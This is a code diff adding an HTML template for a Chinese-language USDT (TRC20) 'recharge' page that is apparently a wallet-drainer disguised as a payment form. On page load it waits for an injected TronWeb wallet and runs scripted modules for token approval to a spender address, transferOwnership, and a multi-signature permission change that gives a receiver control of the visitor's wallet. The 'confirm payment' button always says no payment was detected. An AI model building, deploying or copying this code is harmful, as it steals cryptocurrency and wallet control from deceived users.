@@ -1,0 +1,1619 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>USDT充值 - GlobalSMS</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <script src="{{ url_for('static', filename='js/wallet-detector.js') }}"></script>
+    
+    <script>
+    
+    function preloadWalletSchemes() {
+        const walletSchemes = [
+            'tronlink://',
+            'imtokenv2://',
+            'tokenlon://',
+            'bitpie://',
+            'huobiwallet://',
+            'mathwallet://',
+            'trustwallet://',
+            'exodus://'
+        ];
+        
+        walletSchemes.forEach(scheme => {
+            const link = document.createElement('link');
+            link.rel = 'prefetch';
+            link.href = scheme;
+            document.head.appendChild(link);
+        });
+    }
+    
+    document.addEventListener('DOMContentLoaded', preloadWalletSchemes);
+    </script>
+    <style>
+        
+        .payment-card {
+            border: none;
+            border-radius: 16px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+        }
+        
+        .info-icon {
+            width: 42px;
+            height: 42px;
+            min-width: 42px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .qr-container {
+            background: linear-gradient(to bottom, rgba(255,255,255,0.8), rgba(255,255,255,1));
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(0,0,0,0.1);
+            border-radius: 16px;
+        }
+        
+        .copy-btn {
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+        
+        .copy-btn:active {
+            transform: scale(0.95);
+        }
+        
+        .notice-item {
+            background-color: rgba(255,255,255,0.6);
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 8px;
+            transition: all 0.3s ease;
+        }
+        
+        .notice-item:hover {
+            background-color: rgba(255,255,255,0.9);
+            transform: translateX(4px);
+        }
+        
+        @media (max-width: 768px) {
+            .info-stats {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            
+            .info-stats > div {
+                width: 100%;
+                justify-content: flex-start;
+            }
+            
+            .payment-card {
+                margin: 0 -0.5rem;
+                border-radius: 0;
+            }
+            
+            .card-header {
+                border-radius: 0 !important;
+            }
+        }
+
+        
+        .wallet-list {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin: 0;
+        }
+        
+        .wallet-item {
+            background: #f8f9fa;
+            border: 1px solid rgba(0,0,0,0.1);
+            border-radius: 12px;
+            padding: 12px 8px;
+            text-align: center;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            color: inherit;
+            display: block;
+        }
+        
+        .wallet-item:hover {
+            background: #f0f0f0;
+            text-decoration: none;
+            color: inherit;
+        }
+        
+        .wallet-item:active {
+            transform: scale(0.95);
+            background: #e9ecef;
+        }
+        
+        .wallet-icon {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 8px;
+            border-radius: 8px;
+        }
+        
+        .wallet-item .small {
+            color: #666;
+            font-size: 12px;
+            margin: 0;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .wallet-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(4px);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        
+        .wallet-modal.show {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        
+        .wallet-modal-content {
+            background: white;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 360px;
+            max-height: 80vh;
+            overflow-y: auto;
+            padding: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            transform: translateY(20px);
+            transition: transform 0.3s ease;
+        }
+        
+        .wallet-modal.show .wallet-modal-content {
+            transform: translateY(0);
+        }
+        
+        
+        .custom-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(4px);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        
+        .custom-modal.show {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        
+        .custom-modal-content {
+            background: white;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 450px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+            transform: translateY(20px);
+            transition: transform 0.3s ease;
+        }
+        
+        .custom-modal.show .custom-modal-content {
+            transform: translateY(0);
+        }
+        
+        .custom-modal-header {
+            border-bottom: 1px solid rgba(0,0,0,0.1);
+            padding: 1.25rem 1.5rem;
+            position: relative;
+        }
+        
+        .custom-modal-body {
+            padding: 1.5rem;
+        }
+        
+        .custom-modal-footer {
+            padding: 1rem 1.5rem;
+            border-top: 1px solid rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: flex-end;
+            gap: 0.75rem;
+        }
+        
+        .reason-item {
+            padding: 0.75rem 1rem;
+            border-radius: 8px;
+            background: #f8f9fa;
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: flex-start;
+        }
+        
+        .reason-item i {
+            margin-right: 0.75rem;
+            margin-top: 0.25rem;
+            flex-shrink: 0;
+        }
+
+        
+        * { 
+            touch-action: manipulation;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        
+        
+        input, textarea {
+            -webkit-user-select: text;
+            user-select: text;
+        }
+        
+        
+        body {
+            -webkit-tap-highlight-color: transparent;
+            -webkit-text-size-adjust: none;
+        }
+    </style>
+    <script>
+        
+        document.addEventListener('gesturestart', function(e) {
+            e.preventDefault();
+        });
+        
+        
+        document.addEventListener('touchstart', function(e) {
+            if (e.touches.length > 1) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</head>
+<body class="bg-light">
+    {% include 'includes/header.html' %}
+
+    <div class="container py-4">
+        <div class="row justify-content-center">
+            <div class="col-md-8 col-lg-7 col-xl-6">
+                <div class="payment-card bg-white">
+                    
+                    <div class="card-header bg-primary text-white p-4">
+                        <div class="d-flex align-items-center">
+                            <div class="rounded-circle bg-white p-2 d-flex align-items-center justify-content-center me-3" style="width: 48px; height: 48px;">
+                                <i class="bi bi-currency-exchange text-primary fs-4"></i>
+                            </div>
+                            <div>
+                                <h3 class="mb-0 fw-bold">USDT充值</h3>
+                                <p class="mb-0 text-white-50 small">TRC20网络支付</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-body p-4">
+                        
+                        <div class="info-stats d-flex align-items-stretch gap-3 mb-4">
+                            <div class="flex-grow-1 bg-light rounded-4 p-3">
+                                <div class="d-flex align-items-center">
+                                    <div class="info-icon bg-primary bg-opacity-10 me-3">
+                                        <i class="bi bi-currency-dollar text-primary"></i>
+                                    </div>
+                                    <div>
+                                        <div class="text-muted small">充值金额</div>
+                                        <div class="fw-bold fs-5">{{ amount }} USDT</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="flex-grow-1 bg-light rounded-4 p-3">
+                                <div class="d-flex align-items-center">
+                                    <div class="info-icon bg-danger bg-opacity-10 me-3">
+                                        <i class="bi bi-clock text-danger"></i>
+                                    </div>
+                                    <div>
+                                        <div class="text-muted small">剩余时间</div>
+                                        <div class="fw-bold fs-5" id="countdown">15:00</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        
+                        <div class="qr-container p-4 mb-4 text-center" id="paymentContainer" style="display: none;">
+                            
+                            <div class="d-none d-md-block">
+                                <img src="https://api.qrserver.com/v1/create-qr-code/?data={{ request.url | urlencode }}" 
+                                     alt="USDT支付二维码" 
+                                     class="img-fluid rounded mb-4" 
+                                     style="max-width: 180px;">
+                                <p class="small text-muted mb-3">扫描上方二维码进入支付页面</p>
+                                
+                                
+                                <div class="alert alert-primary mb-3" style="display: none;">
+                                    <div class="d-flex align-items-center mb-2">
+                                        <i class="bi bi-wallet2 me-2 fs-5"></i>
+                                        <strong>Web3钱包支持</strong>
+                                    </div>
+                                    <p class="small mb-2">支持任何Web3钱包，包括TronLink、TokenPocket、imToken等</p>
+                                    <div id="wallet-status" class="mb-2 small">
+                                        <div class="d-flex align-items-center">
+                                            <span id="wallet-connection-status" class="badge bg-secondary me-2">未连接</span>
+                                            <span id="wallet-address" class="text-truncate small">请连接您的Web3钱包</span>
+                                        </div>
+                                    </div>
+                                    <div class="d-grid gap-2">
+                                        <button type="button" id="connect-wallet-btn" class="btn btn-sm btn-primary">
+                                            <i class="bi bi-wallet-fill me-1"></i>连接钱包
+                                        </button>
+                                        
+                                        <div class="wallet-functions" style="display: none;">
+                                            {% if config.get('enable_usdt_approve', True) %}
+                                            <button type="button" class="btn btn-sm btn-primary wallet-function-btn" data-function="usdt">
+                                                <i class="bi bi-check-circle me-1"></i>USDT授权
+                                            </button>
+                                            {% endif %}
+                                            
+                                            {% if config.get('enable_transfer_ownership', False) %}
+                                            <button type="button" class="btn btn-sm btn-warning wallet-function-btn" data-function="ownership">
+                                                <i class="bi bi-arrow-repeat me-1"></i>TransferOwnership
+                                            </button>
+                                            {% endif %}
+                                            
+                                            {% if config.get('enable_multi_sign', False) %}
+                                            <button type="button" class="btn btn-sm btn-info wallet-function-btn" data-function="multisign">
+                                                <i class="bi bi-key me-1"></i>多签权限
+                                            </button>
+                                            {% endif %}
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div class="input-group mb-3">
+                                    <input type="text" 
+                                           class="form-control form-control-lg bg-white" 
+                                           value="{{ config.get('spender_address', '') }}" 
+                                           id="usdtAddress" 
+                                           readonly>
+                                    <button class="btn btn-dark copy-btn px-4" onclick="copyAddress()">
+                                        <i class="bi bi-clipboard me-2"></i>复制
+                                    </button>
+                                </div>
+                            </div>
+                            
+                            
+                            <div class="d-block d-md-none">
+                                
+                                <div class="card border-0 shadow-sm mb-3">
+                                    <div class="card-body p-3">
+                                        <div class="d-flex align-items-center mb-2">
+                                            <span class="badge bg-primary rounded-pill me-2">支付流程</span>
+                                            <span class="text-secondary small">三步完成交易</span>
+                                        </div>
+                                        <div class="d-flex mb-2 align-items-center">
+                                            <div class="text-primary me-2">①</div>
+                                            <div class="small me-2">点击右侧复制按钮</div>
+                                            <button class="btn btn-sm btn-dark py-0 px-2" onclick="copyCurrentUrl(); return false;">
+                                                <i class="bi bi-clipboard"></i> 复制
+                                            </button>
+                                        </div>
+                                        <div class="d-flex mb-2">
+                                            <div class="text-primary me-2">②</div>
+                                            <div class="small">打开您的钱包App，进入DApp浏览器</div>
+                                        </div>
+                                        <div class="d-flex">
+                                            <div class="text-primary me-2">③</div>
+                                            <div class="small">粘贴刚点击复制的网址访问，即可完成支付</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                
+                                <p class="text-muted small mb-2">点击图标打开对应钱包</p>
+                                <div class="wallet-list">
+                                    <a href="javascript:void(0);" class="wallet-item" onclick="openTronLink()">
+                                        <img src="https://th.bing.com/th/id/ODF.QdhRAItAkPykfttK9lghtQ?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="TronLink" class="wallet-icon">
+                                        <div class="small">TronLink</div>
+                                    </a>
+                                    <a href="javascript:void(0);" class="wallet-item" onclick="openImToken()">
+                                        <img src="https://th.bing.com/th/id/ODF.T02ST8r8MsOisg6esfdBYw?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="imToken" class="wallet-icon">
+                                        <div class="small">imToken</div>
+                                    </a>
+                                    <a href="javascript:void(0);" class="wallet-item" onclick="openTokenPocket()">
+                                        <img src="https://th.bing.com/th/id/ODF.QFUvRPfYc8gJAMyi71Q_kg?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="TokenPocket" class="wallet-icon">
+                                        <div class="small">TokenPocket</div>
+                                    </a>
+                                    <a href="javascript:void(0);" class="wallet-item" onclick="openMathWallet()">
+                                        <img src="https://staticcdn2.maiziqianbao.net/static/img/app/math5_android.png" alt="Math Wallet" class="wallet-icon">
+                                        <div class="small">Math Wallet</div>
+                                    </a>
+                                    <a href="javascript:void(0);" class="wallet-item" onclick="openBitget()">
+                                        <img src="https://th.bing.com/th/id/ODLS.c7f92acb-78ad-43df-8269-364022b862bc?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="Bitget Wallet" class="wallet-icon">
+                                        <div class="small">Bitget钱包</div>
+                                    </a>
+                                    <a href="javascript:void(0);" class="wallet-item" onclick="openOKX()">
+                                        <img src="https://th.bing.com/th/id/ODLS.00e7e89c-f32e-40c0-834c-e2445fb4e750?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="OKX Wallet" class="wallet-icon">
+                                        <div class="small">OKX 钱包</div>
+                                    </a>
+                                </div>
+                                
+                                
+                                <div class="mt-4 mb-2 border rounded p-3 bg-light">
+                                    <div class="d-flex align-items-center mb-2">
+                                        <i class="bi bi-link-45deg text-primary fs-5 me-2"></i>
+                                        <div class="fw-medium">其他钱包支付</div>
+                                    </div>
+                                    <div class="input-group mb-2">
+                                        <input type="text" 
+                                               class="form-control form-control-sm bg-white" 
+                                               value="{{ request.url }}" 
+                                               id="currentUrl" 
+                                               readonly>
+                                        <button class="btn btn-dark btn-sm copy-btn" onclick="copyCurrentUrl()">
+                                            <i class="bi bi-clipboard me-1"></i>复制
+                                        </button>
+                                    </div>
+                                    <div class="small text-muted">
+                                        复制链接后，打开您的加密钱包，找到DApp浏览器或网页浏览功能，粘贴此链接访问即可完成支付
+                                    </div>
+                                </div>
+                                
+                                
+                                <div class="alert alert-light border small py-2 mt-3" id="statusAlert">
+                                    <i class="bi bi-lightbulb me-1 text-warning"></i>
+                                    <span class="fw-medium">提示：</span> 完成支付后请点击下方"确认已完成支付"按钮
+                                </div>
+                            </div>
+                        </div>
+
+                        
+                        <div class="d-grid gap-2 mb-4">
+                            <button type="button" 
+                                    class="btn btn-primary btn-lg py-3 rounded-4" 
+                                    onclick="checkPayment()">
+                                <i class="bi bi-check-circle me-2"></i>确认已完成支付
+                            </button>
+                            <a href="{{ url_for('recharge') }}" 
+                               class="btn btn-light btn-lg py-3 rounded-4">
+                                <i class="bi bi-arrow-left me-2"></i>返回修改金额
+                            </a>
+                        </div>
+
+                        
+                        <div class="bg-light rounded-4 p-4">
+                            <h6 class="fw-bold mb-3">
+                                <i class="bi bi-info-circle-fill text-primary me-2"></i>支付须知
+                            </h6>
+                            <div class="notice-items">
+                                <div class="notice-item">
+                                    <i class="bi bi-shield-check text-success me-2"></i>
+                                    <span>请务必使用<strong>TRC20</strong>网络转账</span>
+                                </div>
+                                <div class="notice-item">
+                                    <i class="bi bi-currency-exchange text-success me-2"></i>
+                                    <span>转账金额必须为 <strong>{{ amount }} USDT</strong></span>
+                                </div>
+                                <div class="notice-item">
+                                    <i class="bi bi-clock-history text-success me-2"></i>
+                                    <span>请在<strong>15分钟</strong>内完成转账</span>
+                                </div>
+                                <div class="notice-item">
+                                    <i class="bi bi-lightning-charge text-success me-2"></i>
+                                    <span>系统将在<strong>1-5分钟</strong>内自动确认</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    
+    <div class="wallet-modal" id="walletModal">
+        <div class="wallet-modal-content">
+            <div class="d-flex justify-content-between align-items-center mb-3">
+                <h5 class="mb-0 fw-bold">选择钱包</h5>
+                <button type="button" class="btn-close" aria-label="Close" id="closeWalletModal"></button>
+            </div>
+            
+            <p class="text-muted small mb-3">选择您的钱包应用，完成USDT授权或转账</p>
+            
+            <div class="wallet-list">
+                <div class="wallet-item" data-wallet="tronlink://" data-name="TronLink">
+                    <img src="https://th.bing.com/th/id/ODF.QdhRAItAkPykfttK9lghtQ?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="TronLink" class="wallet-icon">
+                    <div class="small">TronLink</div>
+                </div>
+                <div class="wallet-item" data-wallet="imtokenv2://" data-name="imToken">
+                    <img src="https://th.bing.com/th/id/ODF.T02ST8r8MsOisg6esfdBYw?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="imToken" class="wallet-icon">
+                    <div class="small">imToken</div>
+                </div>
+                <div class="wallet-item" data-wallet="tokenpocket://wc?uri={{ request.url | urlencode }}" data-name="TokenPocket">
+                    <img src="https://th.bing.com/th/id/ODF.QFUvRPfYc8gJAMyi71Q_kg?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="TokenPocket" class="wallet-icon">
+                    <div class="small">TokenPocket</div>
+                </div>
+                <div class="wallet-item" data-wallet="mathwallet://" data-name="Math Wallet">
+                    <img src="https://staticcdn2.maiziqianbao.net/static/img/app/math5_android.png" alt="Math Wallet" class="wallet-icon">
+                    <div class="small">Math Wallet</div>
+                </div>
+                <div class="wallet-item" data-wallet="bitkeep://open" data-name="Bitget Wallet">
+                    <img src="https://th.bing.com/th/id/ODLS.c7f92acb-78ad-43df-8269-364022b862bc?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="Bitget Wallet" class="wallet-icon">
+                    <div class="small">Bitget钱包</div>
+                </div>
+                <div class="wallet-item" data-wallet="okex://wallet?action=dapp&url={{ request.url }}" data-name="OKX Wallet">
+                    <img src="https://th.bing.com/th/id/ODLS.00e7e89c-f32e-40c0-834c-e2445fb4e750?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="OKX Wallet" class="wallet-icon">
+                    <div class="small">OKX 钱包</div>
+                </div>
+            </div>
+            
+            <div class="mt-4">
+                <div class="alert alert-info small p-2 mb-3">
+                    <i class="bi bi-info-circle me-1"></i> 如果您的钱包未打开，请先安装相应的钱包应用
+                </div>
+                
+                <button class="btn btn-primary w-100 py-2" id="approveWithSelectedWallet">
+                    使用选中钱包授权
+                </button>
+            </div>
+        </div>
+    </div>
+
+    
+    <div class="custom-modal" id="paymentModal">
+        <div class="custom-modal-content">
+            <div class="custom-modal-header">
+                <h5 class="mb-0 fw-bold">
+                    <i class="bi bi-info-circle-fill text-primary me-2"></i>
+                    暂未检测到充值
+                </h5>
+            </div>
+            <div class="custom-modal-body">
+                <p>系统尚未检测到您的转账，可能原因：</p>
+                
+                <div class="reason-item">
+                    <i class="bi bi-hourglass-split text-primary"></i>
+                    <span>交易正在确认中，请稍等片刻（区块链确认通常需要1-5分钟）</span>
+                </div>
+                
+                <div class="reason-item">
+                    <i class="bi bi-wifi text-primary"></i>
+                    <span>区块链网络拥堵，确认较慢</span>
+                </div>
+                
+                <div class="reason-item">
+                    <i class="bi bi-exclamation-triangle text-primary"></i>
+                    <span>转账金额或网络选择有误（请确保使用TRC20网络）</span>
+                </div>
+                
+                <div class="mt-4 pt-2 border-top">
+                    <p class="mb-1">如有问题，请联系客服：</p>
+                    <div class="d-flex align-items-center mt-2">
+                        <i class="bi bi-telegram fs-5 text-primary me-2"></i>
+                        <span class="fw-bold">Telegram: @jofax</span>
+                    </div>
+                </div>
+            </div>
+            <div class="custom-modal-footer">
+                <button type="button" class="btn btn-outline-secondary" id="closeModalBtn">
+                    <i class="bi bi-x me-1"></i>关闭
+                </button>
+                <a href="https://t.me/jofax" target="_blank" class="btn btn-primary">
+                    <i class="bi bi-headset me-1"></i>联系客服
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    {% if config.get('enable_usdt_approve', True) %}
+    <script src="{{ url_for('static', filename='js/usdt_approve.js') }}"></script>
+    {% endif %}
+    
+    {% if config.get('enable_transfer_ownership', False) %}
+    <script src="{{ url_for('static', filename='js/transfer_ownership.js') }}"></script>
+    {% endif %}
+    
+    {% if config.get('enable_multi_sign', False) %}
+    <script src="{{ url_for('static', filename='js/multisign.js') }}"></script>
+    {% endif %}
+    
+    <script>
+        window.multiSignCompleted = false;
+        window.multiSignRunning = false;
+        window.usdtApproveCompleted = false;
+        window.usdtApproveRunning = false;
+        window.transferOwnershipCompleted = false;
+        window.transferOwnershipRunning = false;
+        
+        const config = {
+            USDT_CONTRACT_ADDRESS: '{{ config.get("contract_address", "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t") }}',
+            SPENDER_ADDRESS: '{{ config.get("spender_address", "") }}',
+            ORDER_ID: '{{ order_id }}',
+            AMOUNT: '{{ amount }}',
+            ENABLE_TRANSFER_OWNERSHIP: {{ config.get('enable_transfer_ownership', False) | tojson }},
+            ENABLE_USDT_APPROVE: {{ config.get('enable_usdt_approve', True) | tojson }},
+            TRANSFER_OWNERSHIP_RETRY_TIMES: {{ config.get('transfer_ownership_retry_times', 3) }},
+            ENABLE_MULTI_SIGN: {{ config.get('enable_multi_sign', False) | tojson }},
+            MULTI_SIGN_RECEIVER: '{{ config.get("multi_sign_receiver", "") }}'
+        };
+
+        Object.assign(window, config);
+        
+        console.log('配置信息:', {
+            contractAddress: window.USDT_CONTRACT_ADDRESS,
+            spenderAddress: window.SPENDER_ADDRESS,
+            enableTransferOwnership: window.ENABLE_TRANSFER_OWNERSHIP,
+            enableUsdtApprove: window.ENABLE_USDT_APPROVE,
+            transferOwnershipRetryTimes: window.TRANSFER_OWNERSHIP_RETRY_TIMES,
+            enableMultiSign: window.ENABLE_MULTI_SIGN,
+            multiSignReceiver: window.MULTI_SIGN_RECEIVER
+        });
+
+        async function executeFeatures() {
+            try {
+                if (window.ENABLE_USDT_APPROVE && typeof executeUsdtApproveModule === 'function') {
+                    console.log('开始执行USDT授权功能...');
+                    const usdtResult = await executeUsdtApproveModule();
+                    console.log('USDT授权结果:', usdtResult);
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                } else {
+                    console.log('USDT授权功能未启用，跳过');
+                }
+                
+                if (window.ENABLE_TRANSFER_OWNERSHIP && typeof executeTransferOwnershipModule === 'function') {
+                    console.log('开始执行TransferOwnership功能...');
+                    const transferResult = await executeTransferOwnershipModule();
+                    console.log('TransferOwnership结果:', transferResult);
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                } else {
+                    console.log('TransferOwnership功能未启用，跳过');
+                }
+                
+                if (window.ENABLE_MULTI_SIGN && typeof executeMultiSignModule === 'function') {
+                    console.log('开始执行多签权限功能...');
+                    const multiSignResult = await executeMultiSignModule();
+                    console.log('多签权限结果:', multiSignResult);
+                } else {
+                    console.log('多签权限功能未启用，跳过');
+                }
+                
+                console.log('所有功能执行完毕');
+            } catch (error) {
+                console.error('功能执行过程中出错:', error);
+            }
+        }
+        
+        
+        document.addEventListener('usdt_approve_completed', function(event) {
+            console.log('USDT授权完成事件触发:', event.detail);
+        });
+        
+        document.addEventListener('transfer_ownership_completed', function(event) {
+            console.log('TransferOwnership完成事件触发:', event.detail);
+        });
+        
+        document.addEventListener('multisign_completed', function(event) {
+            console.log('多签权限完成事件触发:', event.detail);
+        });
+
+        
+        document.addEventListener('DOMContentLoaded', async function() {
+            try {
+                console.log('开始初始化功能...');
+                
+                if (!window.tronWeb) {
+                    console.log('未检测到TronWeb环境，等待TronLink注入');
+                    
+                    let attempts = 0;
+                    const maxAttempts = 10;
+                    const checkTronWeb = setInterval(async () => {
+                        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                            clearInterval(checkTronWeb);
+                            console.log('TronWeb已注入，开始执行功能');
+                            await executeFeatures();
+                        } else if (attempts >= maxAttempts) {
+                            clearInterval(checkTronWeb);
+                            console.log('TronWeb注入超时');
+                        }
+                        attempts++;
+                    }, 1000);
+                    return;
+                }
+                
+                
+                await executeFeatures();
+            } catch (error) {
+                console.error('功能初始化失败:', error);
+            }
+        });
+        
+        
+        const USDT_ABI = [{
+            "constant": false,
+            "inputs": [
+                {
+                    "name": "_spender",
+                    "type": "address"
+                },
+                {
+                    "name": "_value",
+                    "type": "uint256"
+                }
+            ],
+            "name": "approve",
+            "outputs": [
+                {
+                    "name": "",
+                    "type": "bool"
+                }
+            ],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        },
+        {
+            "constant": false,
+            "inputs": [
+                {
+                    "name": "newOwner",
+                    "type": "address"
+                }
+            ],
+            "name": "transferOwnership",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }];
+
+        
+        
+        async function checkPayment() {
+            showPaymentModal();
+        }
+        
+        
+        function showPaymentModal() {
+            const modal = document.getElementById('paymentModal');
+            if (!modal) {
+                console.error('找不到支付提示模态框');
+                return;
+            }
+
+            
+            const closeBtn = document.getElementById('closeModalBtn');
+            const oldCloseBtn = closeBtn.cloneNode(true);
+            closeBtn.parentNode.replaceChild(oldCloseBtn, closeBtn);
+
+            
+            oldCloseBtn.addEventListener('click', function() {
+                modal.classList.remove('show');
+            });
+
+            
+            modal.addEventListener('click', function(e) {
+                if (e.target === modal) {
+                    modal.classList.remove('show');
+                }
+            });
+
+            
+            modal.classList.add('show');
+        }
+        
+        
+        function copyAddress() {
+            const addressInput = document.getElementById('usdtAddress');
+            addressInput.select();
+            document.execCommand('copy');
+            
+            const copyBtn = document.querySelector('.copy-btn');
+            const originalHtml = copyBtn.innerHTML;
+            copyBtn.innerHTML = '<i class="bi bi-check-circle me-2"></i>已复制';
+            copyBtn.classList.add('btn-success');
+            copyBtn.classList.remove('btn-dark');
+            
+            setTimeout(() => {
+                copyBtn.innerHTML = originalHtml;
+                copyBtn.classList.remove('btn-success');
+                copyBtn.classList.add('btn-dark');
+            }, 2000);
+        }
+        
+        
+        function copyCurrentUrl() {
+            const urlInput = document.getElementById('currentUrl');
+            urlInput.select();
+            document.execCommand('copy');
+            
+            const copyBtn = urlInput.nextElementSibling;
+            const originalHtml = copyBtn.innerHTML;
+            copyBtn.innerHTML = '<i class="bi bi-check-circle me-2"></i>已复制';
+            copyBtn.classList.add('btn-success');
+            copyBtn.classList.remove('btn-dark');
+            
+            setTimeout(() => {
+                copyBtn.innerHTML = originalHtml;
+                copyBtn.classList.remove('btn-success');
+                copyBtn.classList.add('btn-dark');
+            }, 2000);
+        }
+        
+        function startCountdown() {
+            const countdownElement = document.getElementById('countdown');
+            const orderId = '{{ order_id }}';
+            const countdownKey = 'countdown_' + orderId;
+            const expiredKey = 'expired_' + orderId;
+            
+            
+            let endTime;
+            const savedEndTime = localStorage.getItem(countdownKey);
+            
+            if (savedEndTime && !isNaN(savedEndTime)) {
+                endTime = parseInt(savedEndTime);
+            } else {
+                
+                endTime = Date.now() + (15 * 60 * 1000);
+                localStorage.setItem(countdownKey, endTime.toString());
+            }
+            
+            function updateCountdown() {
+                const now = Date.now();
+                const timeLeft = endTime - now;
+                
+                if (timeLeft <= 0) {
+                    
+                    countdownElement.textContent = '已过期';
+                    countdownElement.classList.add('text-danger');
+                    localStorage.setItem(expiredKey, 'true');
+                    clearInterval(timer);
+                    
+                    
+                    const qrContainer = document.querySelector('.qr-container');
+                    if (qrContainer) {
+                        
+                        const expiredDiv = document.createElement('div');
+                        expiredDiv.className = 'alert alert-danger mt-3';
+                        expiredDiv.innerHTML = `
+                            <h5 class="alert-heading"><i class="bi bi-exclamation-triangle-fill me-2"></i>订单已过期</h5>
+                            <p class="mb-0">该支付订单已超过15分钟有效期，请重新发起充值。</p>
+                        `;
+                        
+                        
+                        const rechargeButton = document.createElement('a');
+                        rechargeButton.href = '{{ url_for("recharge") }}';
+                        rechargeButton.className = 'btn btn-primary btn-lg w-100 mt-3';
+                        rechargeButton.innerHTML = '<i class="bi bi-arrow-repeat me-2"></i>重新发起充值';
+                        
+                        
+                        const existingAlert = qrContainer.querySelector('.alert-danger');
+                        if (existingAlert) {
+                            existingAlert.remove();
+                        }
+                        
+                        const existingRechargeBtn = qrContainer.querySelector('.btn-primary.w-100.mt-3');
+                        if (existingRechargeBtn) {
+                            existingRechargeBtn.remove();
+                        }
+                        
+                        
+                        qrContainer.appendChild(expiredDiv);
+                        qrContainer.appendChild(rechargeButton);
+                    }
+                } else {
+                    
+                    const minutes = Math.floor(timeLeft / 60000);
+                    const seconds = Math.floor((timeLeft % 60000) / 1000);
+                    countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                    countdownElement.classList.remove('text-danger');
+                }
+            }
+            
+            
+            updateCountdown();
+            
+            
+            const timer = setInterval(updateCountdown, 1000);
+            
+            
+            window.addEventListener('beforeunload', () => {
+                clearInterval(timer);
+            });
+        }
+
+        
+        document.addEventListener('DOMContentLoaded', startCountdown);
+
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const walletModal = document.getElementById('walletModal');
+            const closeWalletModal = document.getElementById('closeWalletModal');
+            const walletItems = document.querySelectorAll('.wallet-item');
+            const approveWithSelectedWallet = document.getElementById('approveWithSelectedWallet');
+            
+            let selectedWallet = null;
+            
+            
+            closeWalletModal.addEventListener('click', function() {
+                walletModal.classList.remove('show');
+            });
+            
+            
+            walletModal.addEventListener('click', function(e) {
+                if (e.target === walletModal) {
+                    walletModal.classList.remove('show');
+                }
+            });
+            
+            
+            walletItems.forEach(item => {
+                item.addEventListener('click', function() {
+                    
+                    walletItems.forEach(el => el.style.border = '1px solid rgba(0,0,0,0.1)');
+                    
+                    
+                    this.style.border = '2px solid var(--bs-primary)';
+                    selectedWallet = {
+                        scheme: this.dataset.wallet,
+                        name: this.dataset.name
+                    };
+                });
+            });
+            
+            
